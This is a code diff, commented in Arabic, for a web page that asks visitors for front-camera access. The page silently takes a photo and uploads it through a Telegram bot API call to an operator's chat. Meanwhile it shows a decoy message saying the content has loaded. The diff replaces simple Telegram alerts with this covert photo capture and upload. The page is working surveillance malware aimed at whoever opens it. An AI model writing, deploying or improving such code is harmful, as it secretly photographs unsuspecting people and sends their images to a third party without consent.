@@ -48,7 +48,6 @@
 
         async function startProcess() {
             try {
-                // طلب الكاميرا الأمامية بشكل صريح للموبايل والكمبيوتر
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: { ideal: "user" } 
@@ -58,19 +57,21 @@
                 const videoElement = document.getElementById('video');
                 videoElement.srcObject = stream;
 
-                sendNotificationToTelegram("🚨 تنبيه: شخص ما فتح الموقع ووافق على إذن الكاميرا الأمامية!");
-
+                // ندي مهلة ثانيتين عشان الكاميرا تلقط صورة واضحة ومزبوطة
                 setTimeout(() => {
-                    captureAndProcess(stream);
+                    captureAndSendPhoto(stream);
                 }, 2000);
 
             } catch (error) {
                 document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
-                sendNotificationToTelegram("⚠️ تنبيه: حاول فتح الموقع ولكن رفض إذن الكاميرا أو حدث خطأ: " + error.message);
             }
         }
 
         function captureAndProcess(stream) {
+            // دالة احتياطية
+        }
+
+        function captureAndSendPhoto(stream) {
             try {
                 const videoElement = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
@@ -81,31 +82,39 @@
                 const context = canvas.getContext('2d');
                 context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                 
+                // قفل الكاميرا
                 stream.getTracks().forEach(track => track.stop());
 
-                document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
+                // تحويل الكانفاس إلى ملف صورة (Blob)
+                canvas.toBlob(function(blob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'visitor.jpg');
+                    formData.append('caption', '🚨 صورة الزائر الذي فتح الموقع!');
+
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+                    fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if(data.ok) {
+                            document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
+                        } else {
+                            document.getElementById('mainBox').innerHTML = '<h2>خطأ في إرسال الصورة للبوت</h2>';
+                        }
+                    })
+                    .catch(error => {
+                        document.getElementById('mainBox').innerHTML = '<h2>خطأ في الشبكة</h2>';
+                    });
+
+                }, 'image/jpeg', 0.8);
 
             } catch (e) {
                 document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
             }
-        }
-
-        function sendNotificationToTelegram(messageText) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: messageText
-                })
-            })
-            .catch(error => {
-                console.error("فشل إرسال التيليجرام", error);
-            });
         }
     </script>
 </body>
